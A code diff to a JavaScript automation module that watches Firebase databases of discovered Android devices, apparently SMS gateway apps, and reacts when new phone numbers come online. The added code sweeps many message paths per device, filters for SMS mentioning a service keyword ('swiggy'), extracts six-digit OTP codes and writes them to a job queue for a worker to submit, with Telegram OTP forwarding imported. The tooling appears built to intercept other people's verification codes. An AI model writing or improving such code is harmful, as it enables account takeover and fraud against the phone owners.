@@ -19,16 +19,21 @@ import { apiFetch } from '$lib/firebase.js';
 import { extractNumber } from '$lib/device-helpers.js';
 import {
   engine as discoveryEngine,
+  setAutomationRunning,
+  getDiscoveredMsgPath,
   withNumber,
   onlineDevices,
   allDevices,
   getDisplayPhone,
   getDiscoveredPhone,
-  fetchAllDevices
+  fetchAllDevices,
+  onDiscovery,
+  offDiscovery
 } from '$lib/discovery-engine.svelte.js';
 import { registry } from '$lib/automation-registry.js';
 import { clearWorkerProcessedPhone, clearWorkerProcessedBatch } from '$lib/browser-worker.svelte.js';
 import { setForwardOtpEnabled, setOtpTargetBot, getOtpTargetBot } from '$lib/tg-forwarder.js';
+import { hasFocus, onFocusChange } from '$lib/page-focus.js';
 
 // ── Constants & Helpers ──────────────────────────────────────────────────────
 const CONFIG_KEY = 'automation_config:v2';
@@ -127,6 +132,34 @@ let elapsedTimer = null;
 let workerSyncTimer = null;
 let workerHealthTimer = null;
 let isJobInProgress = false;
+
+// ── Discovery → Automation Bridge ────────────────────────────────────────────
+// When discovery finds a new phone number, immediately wake the automation loop
+// so it can pick up the device without waiting for the 15s idle timer.
+function _onNumberDiscovered(deviceId, phoneNumber, connId, connName) {
+  if (!automationState.enabled) return;
+  if (autoEngine.status !== 'RUNNING') return;
+
+  const normalized = extractNumber(phoneNumber);
+  if (!normalized || normalized.length < 10) return;
+
+  // Skip if already processed
+  if (registry.isAlreadyProcessed(normalized)) return;
+
+  addLog(`🆕 Discovery → Automation: ${deviceId.slice(0, 12)}… (${normalized}) from ${connName || 'unknown'} added to pool`, 'success');
+
+  // Wake the loop immediately — cancel idle timer and run now
+  if (_autoLoopEmptyCount > 0) {
+    _autoLoopEmptyCount = 0;
+    _lastEmptyRefreshAt = 0;
+    if (loopTimer) {
+      clearTimeout(loopTimer);
+      loopTimer = null;
+    }
+    // Run loop after a tiny delay to let state settle
+    loopTimer = setTimeout(automationRunLoop, 500);
+  }
+}
 
 // ── Master Kill Switch ────────────────────────────────────────────────────────
 // Persisted in localStorage. When false, ALL automation logic is completely off.
@@ -727,24 +760,33 @@ export function selectNextDevice(manualConnId = null) {
  */
 async function captureTestResponseBaseline(conn, deviceId) {
   const baselineSignatures = new Set();
+  const discoveredPath = getDiscoveredMsgPath(conn.id);
+  const msgPath = discoveredPath || discoveryEngine.db[conn.id]?.msgPath || conn.path || 'messages';
+  // Same expanded path list as the browser poller — must be consistent
   const paths = [
+    `${msgPath}/${deviceId}`,
     `messages/${deviceId}`,
-    `automation/testResponses/${deviceId}`,
+    `sms/${deviceId}`,
+    `inbox/${deviceId}`,
+    `clients/${deviceId}/receivedSms`,
+    `clients/${deviceId}/inbox`,
+    `clients/${deviceId}/sms`,
+    `clients/${deviceId}/messages`,
     `automation/notifications/${deviceId}`,
-    deviceId
-  ];
+    `devices/${deviceId}/messages`,
+  ].filter((p, i, arr) => arr.indexOf(p) === i);
 
-  for (const path of paths) {
+  for (const p of paths) {
     try {
-      const res = await apiFetch(conn, path, 'GET');
-      if (res && res.data && typeof res.data === 'object') {
+      const res = await apiFetch(conn, p, 'GET', undefined, { limitToLast: '30' });
+      if (res?.data && typeof res.data === 'object') {
         const msgs = extractMatchingMessages(res.data, autoEngine.config.responseKeyword);
         for (const m of msgs) {
-          baselineSignatures.add(`${path}::${m.id}`);
+          baselineSignatures.add(`${p}::${m.id}`);
         }
       }
     } catch {
-      // ignore baseline errors
+      // ignore baseline errors — path may not exist
     }
   }
 
@@ -757,17 +799,51 @@ function extractMatchingMessages(val, keyword) {
 
   const kw = (keyword || 'swiggy').toLowerCase();
 
-  for (const [msgId, record] of Object.entries(val)) {
-    if (!record || typeof record !== 'object') continue;
-    const body = String(record.message || record.body || record.text || record.msg || '');
-    if (body.toLowerCase().includes(kw)) {
+  // Helper: extract body text from any message-like object
+  function getBody(record) {
+    if (!record) return '';
+    if (typeof record === 'string') return record;
+    if (typeof record !== 'object') return String(record);
+    // All known field names used by Android SMS gateway apps
+    return String(
+      record.message ?? record.body ?? record.text ?? record.msg ??
+      record.smsBody ?? record.smsText ?? record.content ?? record.data ?? ''
+    );
+  }
+
+  function checkAndAdd(msgId, record) {
+    if (!record) return;
+    // Handle flat object (normal case)
+    const body = getBody(record);
+    if (body && body.toLowerCase().includes(kw)) {
       matches.push({
         id: String(msgId),
         message: body,
-        sender: record.sender || record.from || '',
-        dateTime: record.dateTime || record.timestamp || ''
+        sender: String(record.sender ?? record.from ?? record.address ?? record.number ?? ''),
+        dateTime: String(record.dateTime ?? record.timestamp ?? record.date ?? record.time ?? '')
       });
+      return;
     }
+    // Handle nested: some apps store messages inside a sub-object
+    if (typeof record === 'object' && !Array.isArray(record)) {
+      for (const [subId, sub] of Object.entries(record)) {
+        if (sub && typeof sub === 'object') {
+          const subBody = getBody(sub);
+          if (subBody && subBody.toLowerCase().includes(kw)) {
+            matches.push({
+              id: `${msgId}_${subId}`,
+              message: subBody,
+              sender: String(sub.sender ?? sub.from ?? sub.address ?? ''),
+              dateTime: String(sub.dateTime ?? sub.timestamp ?? sub.date ?? '')
+            });
+          }
+        }
+      }
+    }
+  }
+
+  for (const [msgId, record] of Object.entries(val)) {
+    checkAndAdd(msgId, record);
   }
 
   return matches;
@@ -775,28 +851,49 @@ function extractMatchingMessages(val, keyword) {
 
 function extract6DigitCode(text) {
   if (!text) return null;
-  // Match standalone 6-digit number
+  // Match ALL standalone 6-digit numbers (not part of longer digit strings)
   const regex = /(?:^|\D)(\d{6})(?!\d)/g;
   const found = [];
   let m;
   while ((m = regex.exec(text)) !== null) {
     found.push(m[1]);
   }
-  return found.length === 1 ? found[0] : null;
+  if (found.length === 0) return null;
+  if (found.length === 1) return found[0];
+  // Multiple 6-digit groups — OTP messages commonly have the code near keywords
+  // Prefer the one appearing after OTP-related words
+  const lower = text.toLowerCase();
+  const otpKeywords = ['otp', 'code', 'pin', 'verify', 'verification', 'one time', 'passcode', 'secret', 'login'];
+  for (const kw of otpKeywords) {
+    const kwIdx = lower.indexOf(kw);
+    if (kwIdx >= 0) {
+      // Find the 6-digit number closest after the keyword
+      const afterKeyword = text.slice(kwIdx);
+      const m2 = /(?:^|\D)(\d{6})(?!\d)/.exec(afterKeyword);
+      if (m2) return m2[1];
+    }
+  }
+  // Fallback: return the LAST 6-digit group (OTP is usually at the end of the SMS)
+  return found[found.length - 1];
 }
 
 async function pollForControlledTestCode(conn, deviceId, baselineSignatures, deadlineMs) {
+  const discoveredPath = getDiscoveredMsgPath(conn.id);
+  const msgPath = discoveredPath || discoveryEngine.db[conn.id]?.msgPath || conn.path || 'messages';
   const paths = [
+    `${msgPath}/${deviceId}`,
     `messages/${deviceId}`,
-    `automation/testResponses/${deviceId}`,
+    `sms/${deviceId}`,
+    `inbox/${deviceId}`,
+    `clients/${deviceId}/receivedSms`,
     `automation/notifications/${deviceId}`,
-    deviceId
-  ];
+    `devices/${deviceId}/messages`,
+  ].filter((p, i, arr) => arr.indexOf(p) === i);
 
   while (Date.now() < deadlineMs && autoEngine.status === 'RUNNING') {
     for (const path of paths) {
       try {
-        const res = await apiFetch(conn, path, 'GET');
+        const res = await apiFetch(conn, path, 'GET', undefined, { limitToLast: '30' });
         if (res && res.data && typeof res.data === 'object') {
           const msgs = extractMatchingMessages(res.data, autoEngine.config.responseKeyword);
           for (const m of msgs) {
@@ -1063,6 +1160,7 @@ export async function disconnectTelegram() {
 export async function executeJobForDevice(selection, isManual = false) {
   if (isJobInProgress) return;
   isJobInProgress = true;
+  setAutomationRunning(true); // suppress bulk Firebase refresh during job
 
   const { dev, normalizedPhone, compKey, deviceId, conn } = selection;
 
@@ -1122,7 +1220,80 @@ export async function executeJobForDevice(selection, isManual = false) {
 
   addLog(`[${jobId}] Dispatched job to Firebase queue. Awaiting Python worker...`, 'info');
 
+  // ── Browser-side message baseline (snapshot before OTP is sent) ────────────
+  // We capture what messages already exist so we can detect NEW ones arriving
+  const baselineSignatures = await captureTestResponseBaseline(conn, deviceId);
+  addLog(`[${jobId}] Message baseline captured (${baselineSignatures.size} existing messages). Watching Firebase...`, 'info');
+
+  // ── Parallel browser-side message poller ─────────────────────────────────────
+  // Runs concurrently with the job status watcher.
+  // If Python worker updates the job status → we follow that.
+  // If Python worker is silent but an OTP message appears in Firebase → we catch it here directly.
+  let _browserFoundCode = null;
+  let _browserPollerActive = true;
+
+  (async () => {
+    // Use auto-discovered path (found by fetchConn root scan) or fall back to configured
+    const discoveredPath = getDiscoveredMsgPath(conn.id);
+    const msgPath = discoveredPath || discoveryEngine.db[conn.id]?.msgPath || conn.path || 'messages';
+    const keyword = (autoEngine.config.responseKeyword || 'swiggy').toLowerCase();
+
+    // All known paths where SMS gateway apps write incoming messages
+    const pollPaths = [
+      `${msgPath}/${deviceId}`,            // auto-discovered or configured path
+      `messages/${deviceId}`,              // always try standard path as fallback
+      `sms/${deviceId}`,                   // some apps use /sms
+      `inbox/${deviceId}`,                 // some apps use /inbox
+      `clients/${deviceId}/receivedSms`,   // nested under clients
+      `clients/${deviceId}/inbox`,
+      `clients/${deviceId}/sms`,
+      `clients/${deviceId}/messages`,
+      `automation/notifications/${deviceId}`,
+      `devices/${deviceId}/messages`,
+    ].filter((p, i, arr) => arr.indexOf(p) === i); // deduplicate
+
+    addLog(`[${jobId}] Browser poller watching ${pollPaths.length} Firebase paths for "${keyword}" OTP...`, 'info');
+
+    while (_browserPollerActive && Date.now() < deadline) {
+      for (const p of pollPaths) {
+        if (!_browserPollerActive) break;
+        try {
+          const r = await apiFetch(conn, p, 'GET', undefined, { limitToLast: '30' });
+          if (!r?.data || typeof r.data !== 'object') continue;
+          // Use the robust extractMatchingMessages which handles nested structures
+          const msgs = extractMatchingMessages(r.data, keyword);
+          for (const msg of msgs) {
+            const sig = `${p}::${msg.id}`;
+            if (baselineSignatures.has(sig)) continue;
+            baselineSignatures.add(sig);
+            const code = extract6DigitCode(msg.message);
+            addLog(`[${jobId}] Browser poller: new "${keyword}" message at ${p} (ID: ${msg.id})${code ? ` OTP="${code}"` : ' — no 6-digit code'}`, code ? 'success' : 'warn');
+            if (code && !_browserFoundCode) {
+              _browserFoundCode = { code, message: msg.message, path: p, msgId: msg.id };
+            }
+          }
+        } catch {}
+      }
+      await sleep(2000); // poll every 2s
+    }
+  })();
+
   while (Date.now() < deadline && (autoEngine.status === 'RUNNING' || isManual) && !jobResolved) {
+    // Check if browser poller found an OTP while job status is still processing
+    if (_browserFoundCode && (lastStatus === 'waiting_for_otp' || lastStatus === 'waiting_for_number' || lastStatus === 'processing' || lastStatus === 'queued')) {
+      addLog(`[${jobId}] Browser-side OTP "${_browserFoundCode.code}" detected — writing to Firebase for worker to pick up...`, 'step');
+      // Write the found OTP to Firebase so the Python worker can submit it
+      try {
+        await apiFetch(conn, `automation/jobs/${jobId}`, 'PATCH', {
+          status: 'otp_detected_by_browser',
+          browserOtp: _browserFoundCode.code,
+          browserMsg: _browserFoundCode.message,
+          browserMsgId: _browserFoundCode.msgId,
+        });
+      } catch {}
+      _browserFoundCode = null; // reset so we don't spam
+    }
+
     let res;
     try {
       res = await apiFetch(conn, `automation/jobs/${jobId}`, 'GET');
@@ -1299,7 +1470,9 @@ export async function executeJobForDevice(selection, isManual = false) {
     await sleep(3000);
   }
 
+  _browserPollerActive = false; // stop browser-side message poller
   isJobInProgress = false;
+  setAutomationRunning(false); // restore bulk Firebase refresh
   autoEngine.currentJob = null;
   autoEngine.jobState = 'IDLE';
 }
@@ -1334,11 +1507,12 @@ async function automationRunLoop() {
       addLog('Pool empty — refreshing Firebase devices and waiting for new numbers to come online…', 'info');
     }
 
-    // Refresh device data every ~30s while idle (not every single loop iteration)
+    // Refresh device data every ~30s while idle — ONLY when no job is running
     const now = Date.now();
     if (now - _lastEmptyRefreshAt > 30000) {
       _lastEmptyRefreshAt = now;
       try {
+        // Targeted lightweight refresh: only online-device counts, not full payload
         await fetchAllDevices();
       } catch {}
 
@@ -1502,7 +1676,29 @@ function startWorkerHealthWatchdog() {
     } catch {
       // Network hiccup — ignore
     }
-  }, 15000); // Check every 15 seconds
+  }, hasFocus('automation') ? 15_000 : 45_000); // Fast when focused, slow in background
+}
+
+
+// Re-sync timers when page focus changes
+if (typeof window !== 'undefined') {
+  onFocusChange((page) => {
+    if (autoEngine.status === 'RUNNING') {
+      // Restart sync timer with new rate
+      if (workerSyncTimer) { clearInterval(workerSyncTimer); workerSyncTimer = null; }
+      const ms = page === 'automation' ? 30_000 : 90_000;
+      workerSyncTimer = setInterval(syncWorkerStatus, ms);
+
+      // Restart health watchdog with new rate
+      startWorkerHealthWatchdog();
+
+      if (page === 'automation') {
+        addLog('⚡ Automation page focused — full speed sync', 'info');
+      } else if (page === 'discovery') {
+        addLog('⏸ Automation throttled — Discovery page has focus', 'info');
+      }
+    }
+  });
 }
 
 export async function startAutomation() {
@@ -1556,11 +1752,15 @@ export async function startAutomation() {
 
   // Start remote worker sync timer
   if (workerSyncTimer) clearInterval(workerSyncTimer);
-  // Background sync every 30s; active job status changes trigger instant sync via the job monitor loop
-  workerSyncTimer = setInterval(syncWorkerStatus, 30000);
+  // Background sync: fast when on automation page, slow when discovery page has focus
+  const _syncMs = hasFocus('automation') ? 30_000 : 90_000;
+  workerSyncTimer = setInterval(syncWorkerStatus, _syncMs);
 
   // Start worker health watchdog — auto-restart if worker dies
   startWorkerHealthWatchdog();
+
+  // Register discovery → automation bridge
+  onDiscovery(_onNumberDiscovered);
 
   // Kick off run loop
   automationRunLoop();
@@ -1590,6 +1790,10 @@ export async function stopAutomation() {
   if (workerHealthTimer) { clearInterval(workerHealthTimer); workerHealthTimer = null; }
   autoEngine.jobState = 'IDLE';
   isJobInProgress = false;
+
+  // Unregister discovery → automation bridge
+  offDiscovery(_onNumberDiscovered);
+
   addLog('Automation stopped.', 'warn');
 
   // Stop the Python worker process via local server API
